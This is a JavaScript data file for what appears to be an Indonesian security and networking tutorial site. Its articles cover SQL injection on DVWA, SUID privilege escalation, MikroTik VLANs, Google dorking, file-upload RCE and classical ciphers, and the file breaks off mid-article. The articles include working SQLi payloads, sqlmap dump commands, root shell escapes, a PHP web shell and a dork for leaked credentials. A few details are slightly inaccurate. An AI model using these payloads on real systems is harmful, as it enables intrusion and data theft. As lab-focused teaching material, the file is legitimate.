(function () {
  function esc(str) {
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  const COPY_ICON =
    '<svg class="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg>';

  const CALLOUT_ICONS = {
    note: '<svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>',
    warning: '<svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M12 9v4m0 4h.01M4.93 4.93l14.14 14.14"/></svg>',
    tip: '<svg class="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>',
  };

  const CALLOUT_TITLES = { note: "CATATAN", warning: "PERINGATAN", tip: "TIPS" };

  function callout(type, html, title) {
    return (
      '<div class="kb-callout ' + type + '">' +
      '<div class="flex items-center gap-2 font-mono text-sm font-semibold text-' +
      (type === "note" ? "kb-cyan" : type === "warning" ? "amber-400" : "kb-green") +
      '">' + CALLOUT_ICONS[type] + (title || CALLOUT_TITLES[type]) + "</div>" +
      '<p class="mt-2 text-sm text-slate-300">' + html + "</p></div>"
    );
  }

  function codeBlock(lang, code) {
    return (
      '<div class="code-block" data-lang="' + lang + '">' +
      '<div class="code-header">' +
      '<span class="code-dot bg-rose-500/80"></span>' +
      '<span class="code-dot bg-amber-400/80"></span>' +
      '<span class="code-dot bg-emerald-400/80"></span>' +
      '<span class="code-lang">' + lang + "</span>" +
      '<button class="copy-btn" type="button">' + COPY_ICON + " salin</button>" +
      "</div>" +
      "<pre><code>" + esc(code) + "</code></pre></div>"
    );
  }

  const articlesData = {
    "ctf-web-exploitation": {
      id: "ctf-web-exploitation",
      crumb: "SQL Injection pada Lab DVWA",
      title: "CTF Write-up: SQL Injection pada Lab DVWA",
      category: "cybersecurity",
      difficulty: "Intermediate",
      excerpt:
        "Step-by-step write-up eksploitasi SQL Injection di Damn Vulnerable Web Application, dari reconnaissance hingga dump seluruh database.",
      date: "2026-10-02",
      readTime: 10,
      lab: "DVWA (Docker)",
      author: "Admin KBHub",
      tags: ["ctf", "sqli", "web-exploitation", "writeup"],
      content:
        callout(
          "warning",
          "Semua teknik di artikel ini <strong>hanya untuk lab milik sendiri atau CTF yang terautorasi</strong>. Jangan pernah menguji celah pada sistem yang bukan milikmu.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="tentang-lab">Tentang Lab &amp; Setup</h2>' +
        "<p>Damn Vulnerable Web Application (DVWA) adalah aplikasi web sengaja dibuat rentan untuk latihan. Kita akan menyerang modul <strong>SQL Injection</strong> dengan security level <code>Low</code>, di mana input user langsung masuk ke query tanpa sanitasi.</p>" +
        codeBlock(
          "bash",
          "# jalankan DVWA via Docker\ndocker run -d -p 8080:80 vulnerables/web-dvwa\n\n# akses aplikasi\n# browser → http://localhost:8080\n# login: admin / password"
        ) +
        callout(
          "note",
          "Pastikan security level di menu <em>DVWA Security</em> diset ke <strong>Low</strong> sebelum memulai, agar fokus kita pada konsep SQLi murni."
        ) +
        '<h2 id="deteksi-awal">1. Deteksi Awal (Manual)</h2>' +
        "<p>Di halaman <code>vulnerabilities/sqli/</code>, terdapat input <em>User ID</em>. Uji tanda kutip sederhana untuk memicu error:</p>" +
        codeBlock(
          "bash",
          "# input pada form User ID\n1'\n\n# hasil yang diharapkan (tanda kutip mengubah sintaks SQL):\n# You have an error in your SQL syntax; ... near '''' at line 1"
        ) +
        "<p>Error tersebut membuktikan bahwa input user dieksekusi langsung oleh database. Konfirmasi lanjutan dengan UNION-based probe:</p>" +
        codeBlock(
          "bash",
          "# deteksi jumlah kolom pada query SELECT\n1' ORDER BY 1-- -\n1' ORDER BY 2-- -\n1' ORDER BY 3-- -\n# stop ketika muncul error → jumlah kolom = angka terakhir yang berhasil"
        ) +
        '<h2 id="boolean-blind">2. Boolean-Based Blind SQLi</h2>' +
        "<p>Jika output query tidak langsung tampil (blind), kita bisa membaca data per bit menggunakan perbandingan boolean:</p>" +
        codeBlock(
          "bash",
          "# kondisi benar → data tampil\n1' AND 1=1-- -\n\n# kondisi salah → data kosong\n1' AND 1=2-- -\n\n# ekstrak karakter pertama username\n1' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a'-- -"
        ) +
        '<h2 id="otomasi-sqlmap">3. Otomasi dengan sqlmap</h2>' +
        "<p>Setelah tangan terbiasa dengan mekanismenya, otomasi dengan sqlmap mempercepat ekstraksi:</p>" +
        codeBlock(
          "bash",
          "# enumerasi database yang tersedia\nsqlmap -u \"http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID=SESSIONKAMU\" \\\n  --dbs\n\n# dump seluruh tabel dari database dvwa\nsqlmap -u \"http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit\" \\\n  --cookie=\"security=low; PHPSESSID=SESSIONKAMU\" \\\n  -D dvwa -T users --dump"
        ) +
        '<h2 id="dump-data">4. Hasil Dump &amp; Analisis</h2>' +
        "<p>Hasil akhir berupa tabel user beserta hash password-nya:</p>" +
        '<table><thead><tr><th>user_id</th><th>user</th><th>password (hash)</th></tr></thead><tbody>' +
        "<tr><td>1</td><td>admin</td><td>e6e060c2a3d17b1d0e2b0e3a1c1f8e7d</td></tr>" +
        "<tr><td>2</td><td>gordonb</td><td>e99a18c428cb38d5f260853678922e03</td></tr>" +
        "</tbody></table>" +
        "<p>Hash tersebut bisa di-crack dengan <code>hashcat</code> atau <code>john</code> — namun di CTF, biasanya flag sudah cukup didapat dari data yang berhasil di-dump.</p>" +
        '<h2 id="pencegahan">5. Pencegahan (untuk Developer)</h2>' +
        "<ul>" +
        "<li>Gunakan <strong>prepared statements</strong> / parameterized query — pisahkan antara SQL code dan data</li>" +
        "<li>Terapkan <strong>least privilege</strong> pada database user aplikasi</li>" +
        "<li>Validasi input di sisi server, jangan percaya output dari client</li>" +
        "<li>Nonaktifkan pesan error verbose di production</li>" +
        "</ul>" +
        codeBlock(
          "php",
          "<?php\n// prepared statement dengan PDO — aman dari SQLi\n$stmt = $pdo->prepare('SELECT * FROM users WHERE user_id = :id');\n$stmt->execute(['id' => $_GET['id']]);\n$user = $stmt->fetch();"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>SQL Injection tetap menjadi salah satu celah web paling berbahaya (masuk <strong>OWASP Top 10</strong>). Dari satu input yang tidak divalidasi, penyerang bisa membaca, mengubah, bahkan menghapus seluruh isi database. Solusi utamanya sederhana: <strong>parameterized query</strong>.</p>" +
        callout(
          "tip",
          "Latihan lanjutan: coba modul <strong>SQL Injection (Blind)</strong> dan <strong>SQL Injection (Stacked)</strong> di DVWA, lalu bandingkan tekniknya dengan yang sudah dipelajari di sini."
        ),
    },

    "linux-suid-privesc": {
      id: "linux-suid-privesc",
      crumb: "Privilege Escalation via SUID",
      title: "Linux Privilege Escalation via SUID Binary",
      category: "linux",
      difficulty: "Advanced",
      excerpt:
        "Pelajari cara menemukan dan mengeksploitasi binary berflag SUID untuk eskalasi privilegi dari user biasa ke root di Linux.",
      date: "2026-10-08",
      readTime: 12,
      lab: "Kali Linux / Ubuntu 22.04",
      author: "Admin KBHub",
      tags: ["linux", "privesc", "suid", "security"],
      content:
        callout(
          "warning",
          "Semua teknik di artikel ini <strong>hanya untuk pembelajaran</strong> di lab milik sendiri atau CTF yang terautorasi. Eksploitasi sistem tanpa izin adalah tindakan ilegal.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="pendahuluan">Apa itu SUID?</h2>' +
        "<p><strong>SUID (Set User ID)</strong> adalah special permission pada Unix/Linux yang, ketika diset pada sebuah file executable, memaksa proses berjalan dengan <em>privilege owner file</em>, bukan privilege user yang mengeksekusinya.</p>" +
        "<p>Pada praktiknya, jika binary milik <code>root</code> memiliki flag SUID dan tidak dikonfigurasi dengan aman, user biasa bisa memanipulasinya untuk menjalankan perintah sebagai root.</p>" +
        codeBlock(
          "bash",
          "# contoh: binary find yang memiliki flag SUID\n-rwsr-xr-x 1 root root 54320 Jan 15 10:22 /usr/bin/find\n\n# rws pada posisi owner = SUID aktif\n# eksekusi binary → proses berjalan sebagai root"
        ) +
        '<h2 id="enumerasi">1. Enumerasi Binary SUID</h2>' +
        "<p>Langkah pertama selalu enumerasi. Cari semua file dengan bit SUID di seluruh filesystem:</p>" +
        codeBlock(
          "bash",
          "# cari semua binary SUID\nfind / -perm -u=s -type f 2>/dev/null\n\n# filter hanya yang owned root\nfind / -perm -4000 -user root -type f 2>/dev/null | xargs ls -la\n\n# alternatif dengan locate (lebih cepat)\nlocate <nama-binary> | xargs ls -la 2>/dev/null"
        ) +
        callout(
          "note",
          "Fokus pada binary yang <em>tidak lazim</em> seperti <code>find</code>, <code>nmap</code>, <code>vim</code>, <code>python</code>, <code>awk</code>, dan <code>cp</code>. Binary standar SUID seperti <code>sudo</code> dan <code>passwd</code> sudah diperiksa vendor dan relatif aman."
        ) +
        '<h2 id="eksploitasi">2. Eksploitasi: GTFOBins</h2>' +
        "<p>Banyak binary SUID yang \"tidak berbahaya\" justru bisa dipakai menjalankan shell interaktif lewat parameter tertentu. Database rujukannya adalah <a href=\"https://gtfobins.github.io\" target=\"_blank\" rel=\"noopener\">GTFOBins</a>.</p>" +
        "<p>Contoh nyata dengan binary <code>find</code> yang memiliki SUID root:</p>" +
        codeBlock(
          "bash",
          "# opsi -exec menjalankan perintah lain dari dalam find\nfind . -exec /bin/sh -p \\;\n\n# verifikasi siapa kita sekarang\nwhoami\n# → root\n\nid\n# → uid=0(root) gid=0(root) groups=0(root)"
        ) +
        "<p>Contoh lain dengan <code>python</code> (jika binary python juga ber-SUID):</p>" +
        codeBlock(
          "bash",
          "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"
        ) +
        '<h2 id="mitigasi">3. Mitigasi untuk Admin</h2>' +
        "<p>Sebagai sysadmin, lakukan langkah pencegahan berikut:</p>" +
        "<ul>" +
        "<li>Audit berkala: <code>find / -perm -4000 -type f 2&gt;/dev/null</code></li>" +
        "<li>Hilangkan bit SUID yang tidak perlu: <code>chmod u-s /path/binary</code></li>" +
        "<li>Gunakan <strong>principle of least privilege</strong> — berikan user hanya permission yang dibutuhkan</li>" +
        "<li>Aktifkan <strong>AppArmor/SELinux</strong> untuk membatasi konteks eksekusi binary</li>" +
        "<li>Monitor dengan tools seperti <code>auditd</code> atau <code>rkhunter</code></li>" +
        "</ul>" +
        codeBlock(
          "bash",
          "# hapus bit SUID dari binary yang tidak perlu\nsudo chmod u-s /usr/bin/find\n\n# audit: cari binary SUID yang owned root\nsudo find / -perm -4000 -user root -type f -exec ls -la {} \\;"
        ) +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>SUID misconfiguration adalah salah satu jalur eskalasi privilegi paling umum di Linux. Dengan enumerasi menyeluruh dan rujukan GTFOBins, sebagian besar kasus bisa dieksploitasi dalam hitungan menit. Untuk sisi pertahanan, audit rutin dan least privilege adalah kunci utamanya.</p>" +
        callout(
          "tip",
          "Coba materi ini di lab <strong>TryHackMe</strong> (room: Linux PrivEsc) atau <strong>OverTheWire: Bandit</strong> untuk mempertajam skill enumeration kamu.",
          "LATIHAN"
        ),
    },

    "mikrotik-basic": {
      id: "mikrotik-basic",
      crumb: "VLAN & Inter-VLAN Routing",
      title: "Konfigurasi VLAN & Inter-VLAN Routing di MikroTik",
      category: "networking",
      difficulty: "Intermediate",
      excerpt:
        "Panduan lengkap membagi jaringan ke dalam beberapa VLAN menggunakan MikroTik RouterOS beserta konfigurasi inter-VLAN routing.",
      date: "2026-10-05",
      readTime: 15,
      lab: "RouterOS v7 (CHR)",
      author: "Admin KBHub",
      tags: ["mikrotik", "vlan", "routing", "networking"],
      content:
        '<h2 id="konsep-topologi">1. Konsep &amp; Topologi</h2>' +
        "<p><strong>VLAN (Virtual LAN)</strong> membagi satu switch fisik menjadi beberapa jaringan logis yang terisolasi. Untuk latihan ini kita pakai topologi 3 VLAN:</p>" +
        '<table><thead><tr><th>VLAN ID</th><th>Nama</th><th>Subnet</th><th>Gateway</th></tr></thead><tbody>' +
        "<tr><td>10</td><td>Management</td><td>192.168.10.0/24</td><td>192.168.10.1</td></tr>" +
        "<tr><td>20</td><td>Staff</td><td>192.168.20.0/24</td><td>192.168.20.1</td></tr>" +
        "<tr><td>30</td><td>Guest</td><td>192.168.30.0/24</td><td>192.168.30.1</td></tr>" +
        "</tbody></table>" +
        "<p>Router MikroTik berperan sebagai <strong>gateway</strong> (inter-VLAN routing dilakukan di L3, bukan di switch).</p>" +
        '<h2 id="membuat-vlan">2. Membuat Interface VLAN</h2>' +
        "<p>Buat tiga interface VLAN di atas port uplink (<code>ether1</code>):</p>" +
        codeBlock(
          "bash",
          "# akses terminal RouterOS\n[admin@MikroTik] > /interface vlan add name=vlan10-mgmt vlan-id=10 interface=ether1\n[admin@MikroTik] > /interface vlan add name=vlan20-staff vlan-id=20 interface=ether1\n[admin@MikroTik] > /interface vlan add name=vlan30-guest vlan-id=30 interface=ether1\n\n# verifikasi\n[admin@MikroTik] > /interface vlan print"
        ) +
        callout(
          "note",
          "Port uplink ke switch harus di-<strong>trunk</strong> (mendukung multiple VLAN). Di switch managed, port tersebut biasanya diconfigurasi mode trunk dengan allowed VLAN 10,20,30."
        ) +
        '<h2 id="ip-dhcp">3. Alamat IP &amp; DHCP Server</h2>' +
        "<p>Set gateway pada tiap VLAN, lalu jalankan wizard DHCP:</p>" +
        codeBlock(
          "bash",
          "/ip address add address=192.168.10.1/24 interface=vlan10-mgmt\n/ip address add address=192.168.20.1/24 interface=vlan20-staff\n/ip address add address=192.168.30.1/24 interface=vlan30-guest\n\n# wizard DHCP per VLAN\n/ip dhcp-server setup   # pilih interface → ikuti prompt"
        ) +
        '<h2 id="inter-vlan">4. Inter-VLAN Routing</h2>' +
        "<p>Karena masing-masing VLAN sudah punya gateway di router, routing antar-VLAN otomatis berjalan (connected routes). Yang perlu diperhatikan adalah <strong>firewall filter</strong> agar trafik benar-benar diizinkan:</p>" +
        codeBlock(
          "bash",
          "# izinkan trafik forward antar interface\n/ip firewall filter add chain=forward action=accept \\\n  in-interface=vlan20-staff out-interface=vlan30-guest comment=\"staff→guest\"\n\n# opsisional: izinkan guest berakses internet via NAT masquerade\n/ip firewall nat add chain=srcnat out-interface=ether1 \\\n  action=masquerade comment=\"NAT ke internet\""
        ) +
        callout(
          "warning",
          "Jangan lupa <strong>drop rule</strong> di akhir chain <code>input</code> untuk hardening management access — hanya izinkan VLAN Management (10) untuk masuk ke Winbox/SSH."
        ) +
        '<h2 id="verifikasi">5. Verifikasi</h2>' +
        "<p>Uji konektivitas dari masing-masing VLAN:</p>" +
        codeBlock(
          "bash",
          "# dari PC Staff (192.168.20.x), ping gateway & VLAN lain\nping 192.168.20.1      # gateway sendiri → OK\nping 192.168.10.1      # gateway management → OK (routing jalan)\nping 192.168.30.50      # host di VLAN guest → OK\n\n# cek tabel routing di router\n/ip route print where dst-address~\"192.168\""
        ) +
        "<p>Jika semua target terjangkau, inter-VLAN routing sudah bekerja. Uji juga <strong>isolasi</strong>-nya: host di VLAN Guest tidak boleh mengakses Winbox (TCP 8291) di VLAN Management.</p>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Pembagian VLAN membuat jaringan lebih rapi, aman, dan mudah dikelola. Kunci utamanya: <strong>VLAN = segmentasi logis</strong>, <strong>router = jembatan antar segment</strong>, dan firewall filter sebagai penjebak akses yang tidak diinginkan.</p>" +
        "<p>Daftar perintah inti dari artikel ini:</p>" +
        "<ul>" +
        "<li><code>/interface bridge add</code> — buat bridge sebagai 'router' antar-VLAN</li>" +
        "<li><code>/interface vlan add</code> — aktifkan VLAN di interface fisik</li>" +
        "<li><code>/ip address add</code> — beri gateway IP per VLAN</li>" +
        "<li><code>/ip firewall filter add</code> — atur isolasi antar-VLAN</li>" +
        "<li><code>/ip firewall nat add masquerade</code> — izinkan VLAN ke internet</li>" +
        "</ul>" +
        callout(
          "tip",
          "Praktik lanjutan: coba tambahkan <strong>VLAN 40 (IoT)</strong> yang hanya boleh mengakses internet, dan buktikan isolasinya dari VLAN Staff dengan uji ping/traceroute.",
          "LATIHAN"
        ),
    },

    "osint-google-dorking": {
      id: "osint-google-dorking",
      crumb: "Teknik Google Dorking",
      title: "OSINT Dasar: Teknik Google Dorking untuk Reconnaissance",
      category: "cybersecurity",
      difficulty: "Beginner",
      excerpt:
        "Kuasai operator pencarian khusus (site:, filetype:, inurl:) untuk mengumpulkan informasi target secara legal dan etis.",
      date: "2026-09-19",
      readTime: 9,
      lab: "Browser + OSINT Framework",
      author: "Admin KBHub",
      tags: ["osint", "google-dorking", "recon", "security"],
      content:
        callout(
          "warning",
          "OSINT hanya boleh digunakan untuk keperluan <strong>legal</strong>: riset keamanan milik sendiri, CTF, atau penugasan yang terautorasi. Mengumpulkan data pribadi orang tanpa izin melanggar privasi dan hukum.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="konsep-dorking">Apa itu Google Dorking?</h2>' +
        "<p><strong>Google Dorking</strong> (advanced search operators) memanfaatkan operator khusus agar Google mengembalikan hasil yang sangat spesifik. Banyak penyerang memakainya untuk menemukan dokumen terpublikasi, panel admin, atau file sensitif yang tak sengaja terindeks — dan seorang defensif harus memahaminya untuk melindungi asetnya sendiri.</p>" +
        codeBlock(
          "bash",
          "# format umum dorking\nsite:domain.com          # batasi hasil ke satu domain\nfiletype:pdf             # cari tipe file tertentu\nintitle:\"index of\"       # cari direktori yang terbuka (directory listing)\ninurl:login              # cari halaman login\ncache:domain.com         # lihat versi cache Google"
        ) +
        '<h2 id="operator-umum">1. Operator yang Sering Dipakai</h2>' +
        "<p>Berikut daftar operator beserta kegunaan praktisnya dalam reconnaissance:</p>" +
        '<table><thead><tr><th>Operator</th><th>Fungsi</th><th>Contoh</th></tr></thead><tbody>' +
        "<tr><td><code>site:</code></td><td>Batas domain/subdomain</td><td><code>site:contoh.com</code></td></tr>" +
        "<tr><td><code>filetype:</code></td><td>Filter ekstensi file</td><td><code>filetype:xls</code></td></tr>" +
        "<tr><td><code>inurl:</code></td><td>Kata kunci di URL</td><td><code>inurl:admin</code></td></tr>" +
        "<tr><td><code>intitle:</code></td><td>Kata kunci di judul</td><td><code>intitle:\"dashboard\"</code></td></tr>" +
        "<tr><td><code>ext:</code></td><td>Alias filetype</td><td><code>ext:conf</code></td></tr>" +
        "<tr><td><code>-</code></td><td>Kecualikan kata</td><td><code>contoh -jobs</code></td></tr>" +
        "</tbody></table>" +
        '<h2 id="contoh-dork">2. Contoh Dork Praktis</h2>' +
        "<p>Beberapa kombinasi yang umum dipakai saat fase recon (ganti <code>contoh.com</code> dengan domain target yang sah):</p>" +
        codeBlock(
          "bash",
          "# daftar file Excel yang terindeks di domain target\nsite:contoh.com filetype:xls\n\n# cari panel login terpublikasi\nsite:contoh.com inurl:login\n\n# dokumen internal yang tak sengaja terindeks\nsite:contoh.com filetype:docx OR filetype:pdf\n\n# direktori dengan directory listing aktif\nsite:contoh.com intitle:\"index of\""
        ) +
        callout(
          "note",
          "Gabungkan beberapa operator sekaligus untuk mempersempit hasil. Perhatikan juga <strong>operator -</strong> untuk mengecualikan kata, misalnya <code>contoh.com -site:blog.contoh.com</code> agar hasil blog tidak mengganggu."
        ) +
        '<h2 id="tool-pendukung">3. Tool Pendukung</h2>' +
        "<p>Untuk otomasi dan pengumpulan hasil yang lebih rapi:</p>" +
        "<ul>" +
        "<li><strong>theHarvester</strong> — ekstrak email, subdomain, dan host dari berbagai sumber</li>" +
        "<li><strong>GHunt</strong> — analisis jejak digital akun Google</li>" +
        "<li><strong>SpiderFoot</strong> — otomasi OSINT dengan ratusan modul sumber</li>" +
        "<li><strong>Wayback Machine</strong> — melihat riwayat halaman situs yang sudah dihapus</li>" +
        "</ul>" +
        codeBlock(
          "bash",
          "# contoh: ambil email & subdomain milik domain sendiri\ntheHarvester -d contoh.com -b google,bing\n\n# cek riwayat snapshot situs lewat wayback\n# browser → https://web.archive.org/web/*/contoh.com"
        ) +
        '<h2 id="mitigasi">4. Mitigasi untuk Organisasi</h2>' +
        "<p>Agar asetmu tidak bocor lewat dorking:</p>" +
        "<ul>" +
        "<li>Blokir file sensitif di <code>robots.txt</code> dan gunakan tag <code>noindex</code></li>" +
        "<li>Jangan unggah dokumen internal ke domain publik</li>" +
        "<li>Pantau indeks Google untuk domainmu secara berkala</li>" +
        "<li>Nonaktifkan directory listing pada web server</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>Google dorking adalah skill dasar OSINT yang murah namun sangat powerful. Dengan memahami cara penyerang mencari informasi, kita justru bisa menutup celah publikasi yang tidak disadari organisasi.</p>" +
        callout(
          "tip",
          "Latihan: jalankan dork <code>site:github.com filetype:env \"DB_PASSWORD\"</code> untuk memahami bagaimana kebocoran kredensial di repository publik bisa ditemukan — lalu pastikan repository milikmu tidak mengandung rahasia.",
          "LATIHAN"
        ),
    },

    "web-exploitation-file-upload-rce": {
      id: "web-exploitation-file-upload-rce",
      crumb: "File Upload hingga RCE",
      title: "Web Exploitation: File Upload Vulnerability hingga RCE",
      category: "cybersecurity",
      difficulty: "Advanced",
      excerpt:
        "Analisis celah unrestricted file upload pada aplikasi PHP, teknik bypass extension check, dan pencegahannya di sisi server.",
      date: "2026-09-07",
      readTime: 16,
      lab: "PHP 8.x + Apache (Docker)",
      author: "Admin KBHub",
      tags: ["web-exploitation", "file-upload", "rce", "php"],
      content:
        callout(
          "warning",
          "Materi ini untuk <strong>lab dan CTF yang terautorasi</strong> saja. Mengeksploitasi celah upload pada sistem produksi tanpa izin adalah tindakan kriminal.",
          "PERINGATAN ETIKA"
        ) +
        '<h2 id="konsep-rce">Apa itu RCE lewat File Upload?</h2>' +
        "<p><strong>RCE (Remote Code Execution)</strong> terjadi ketika aplikasi mengizinkan user mengunggah file yang ternyata berupa script executable (misalnya <code>.php</code>), lalu file itu dieksekusi oleh web server. Dari sini penyerang bisa menjalankan perintah apapun sebagai user web (misal <code>www-data</code>).</p>" +
        '<h2 id="enumerasi-upload">1. Enumerasi Form Upload</h2>' +
        "<p>Identifikasi dulu jenis validasi yang dipakai server:</p>" +
        codeBlock(
          "bash",
          "# cek header respons saat upload file gambar biasa\n# perhatikan Content-Type yang diterima & pesan error\n\n# informasi versi server (fingerprint)\ncurl -I http://target.local/\n# Server: Apache/2.4.52 (Ubuntu)\n# X-Powered-By: PHP/8.1.2"
        ) +
        '<h2 id="bypass-extension">2. Bypass Extension Check</h2>' +
        "<p>Aplikasi rentan sering hanya memeriksa ekstensi nama file. Berikut teknik bypass yang umum:</p>" +
        codeBlock(
          "bash",
          "# 1. ekstensi ganda (double extension)\nshell.php.jpg        # server salah parse → tetap dieksekusi sebagai php\n\n# 2. kapitalisasi ekstensi (case-sensitive check)\nshell.pHp\n\n# 3. null byte (pada PHP lama)\nshell.php%00.jpg\n\n# 4. content-type palsu (bypass check MIME type)\n# Content-Type: image/jpeg  (padahal isi file script)"
        ) +
        callout(
          "note",
          "Periksa juga apakah direktori upload <strong>mengizinkan eksekusi</strong>. Jika direktori tersebut di-set <code>php_flag engine off</code>, upload shell tidak akan berjalan meski file berhasil tersimpan."
        ) +
        '<h2 id="webshell">3. Upload Web Shell &amp; Eksekusi</h2>' +
        "<p>Setelah file shell tersimpan, akses path-nya untuk menjalankan perintah:</p>" +
        codeBlock(
          "php",
          "<?php\n// contoh web shell minimalis (HANYA untuk lab milik sendiri)\nif (isset($_GET['cmd'])) {\n    echo \"<pre>\" . shell_exec($_GET['cmd']) . \"</pre>\";\n}\n?>"
        ) +
        codeBlock(
          "bash",
          "# akses shell via browser / curl\ncurl \"http://target.local/uploads/shell.php?cmd=id\"\n# uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n# verifikasi & baca file sistem\ncurl \"http://target.local/uploads/shell.php?cmd=cat+/etc/passwd\""
        ) +
        '<h2 id="escalation">4. Dari RCE ke Akses Penuh</h2>' +
        "<p>Dengan RCE, jalur eskalasi berikutnya:</p>" +
        "<ul>" +
        "<li>Baca konfigurasi aplikasi untuk mendapatkan kredensial database</li>" +
        "<li>Drop SSH key ke <code>~/.ssh/authorized_keys</code> agar dapat akses shell persisten</li>" +
        "<li>Periksa SUID binary & cron job untuk eskalasi privilegi (lihat artikel Linux SUID)</li>" +
        "</ul>" +
        '<h2 id="pencegahan">5. Pencegahan (untuk Developer)</h2>' +
        codeBlock(
          "php",
          "<?php\n// validasi ketat: extension whitelist + re-check isi file\n$allowed = ['image/jpeg', 'image/png', 'image/gif'];\n$ext = strtolower(pathinfo($_FILES['foto']['name'], PATHINFO_EXTENSION));\nif (!in_array($_FILES['foto']['type'], $allowed) || !in_array($ext, ['jpg','png','gif'])) {\n    die('File tidak diizinkan');\n}\n// simpan di luar web-root, beri nama acak, jangan pakai nama asli\n$dest = '/var/uploads/' . bin2hex(random_bytes(16)) . '.img';\nmove_uploaded_file($_FILES['foto']['tmp_name'], $dest);"
        ) +
        "<p>Langkah tambahan di sisi server:</p>" +
        "<ul>" +
        "<li>Nonaktifkan eksekusi PHP di direktori upload (<code>php_flag engine off</code>)</li>" +
        "<li>Set nama file acak — jangan percaya nama dari user</li>" +
        "<li>Simpan file di luar document root bila memungkinkan</li>" +
        "<li>Perbarui library <strong>Fileinfo</strong> dan gunakan validasi magic bytes</li>" +
        "</ul>" +
        '<h2 id="kesimpulan">Kesimpulan</h2>' +
        "<p>File upload vulnerability adalah jalur cepat dari fungsi biasa menuju RCE penuh. Kuncinya bukan hanya mengecek ekstensi, tapi juga <strong>menonaktifkan eksekusi di direktori upload</strong> dan memvalidasi isi file sebenarnya.</p>" +
        callout(
          "tip",
          "Latihan: selesaikan room <strong>Upload Vulnerabilities</strong> di TryHackMe untuk berlatih berbagai teknik bypass secara legal dan terstruktur.",
          "LATIHAN"
        ),
    },

    "kriptografi-caesar-xor": {
      id: "kriptografi-caesar-xor",
      crumb: "Caesar Cipher & XOR",
      title: "Kriptografi Dasar CTF: Caesar Cipher & XOR Operation",
      category: "cybersecurity",
      difficulty: "Beginner",
      excerpt:
        "Memahami cipher klasik Caesar dan operasi bitwise XOR — dua materi wajib pemula CTF, lengkap dengan cara memecahkannya.",
      date: "2026-10-06",
      readTime: 11,
      lab: "Kali Linux + Python 3",
      author: "Admin KBHub",
      tags: ["cryptography", "ctf", "caesar", "xor"],
      content:
        '<h2 id="konsep-kripto">Dasar Kriptografi dalam CTF</h2>' +
        "<p>Soal kripto di CTF pemula umumnya bertipe <strong>kelasik</strong> (cipher klasik) atau <strong>bitwise</strong>. Dua yang paling sering muncul adalah <strong>Caesar Cipher</strong> dan <strong>XOR</strong>. Keduanya mudah dipahami asalkan kita tahu cara kerjanya.</p>" +
        '<h2 id="caesar">1. Caesar Cipher (Substitution)</h2>' +
        "<p>Caesar cipher menggeser setiap huruf sejumlah <em>shift</em> tertentu dalam alfabet. Contoh dengan shift 3: <code>A → D</code>, <code>B → E</code>, dan seterusnya. Karena alfabet hanya punya 25 kemungkinan gesekan, cipher ini bisa dibobol dengan <strong>brute force</strong>.</p>" +
        codeBlock(
          "python",
          "# brute force Caesar cipher dengan Python\ndef caesar(text, shift):\n    result = \"\"\n    for ch in text:\n        if ch.isalpha():\n            base = ord('A') if ch.isupper() else ord('a')\n            result += chr((ord(ch) - base + shift) % 26 + base)\n        else:\n            result += ch\n    return result\n\ncipher = \"Khoor Zruog\"\nfor s in range(26):\n    print(s, caesar(cipher, s))\n# output dengan shift 3 → \"Hello World\""
        ) +
        callout(
          "note",
          "Alternatif tanpa coding: gunakan tool <code>cyberchef</code> (online) atau filter <code>ROT13</code> di <code>tr</code>. Untuk soal CTF, coba semua 25 shift dan pilih hasil yang membentuk kata bermakna."
        ) +
        '<h2 id="frequency">2. Frequency Analysis</h2>' +
        "<p>Untuk cipher substitusi multi-huruf (seperti Vigenère), frekuensi huruf menjadi kunci pemecahan. Dalam bahasa Inggris, urutan huruf paling sering: <code>E T A O I N</code>.</p>" +
        codeBlock(
          "bash",
          "# hitung frekuensi huruf dari teks enkripsi\ntr -d ' ' < cipher.txt | fold -w1 | sort | uniq -c | sort -rn | head"
        ) +
        '<h2 id="xor">3. Operasi XOR</h2>' +
        "<p>XOR (exclusive OR) mengembalikan <code>1</code> jika bit berbeda, dan <code>0</code> jika sama. Sifat pentingnya: <strong>XOR dua kali dengan key yang sama mengembalikan data asli</strong> (<code>A ^ K ^ K = A</code>), sehingga banyak enkripsi sederhana memakainya.</p>" +
        '<table><thead><tr><th>A</th><th>B</th><th>A XOR B</th></tr></thead><tbody>' +
        "<tr><td>0</td><td>0</td><td>0</td></tr>" +
        "<tr><td>0</td><td>1</td><td>1</td></tr>" +
        "<tr><td>1</td><td>0</td><td>1</td></tr>" +
        "<tr><td>1</td><td>1</td><td>0</td></tr>" +
        "</tbody></table>" +
        codeBlock(
          "python",
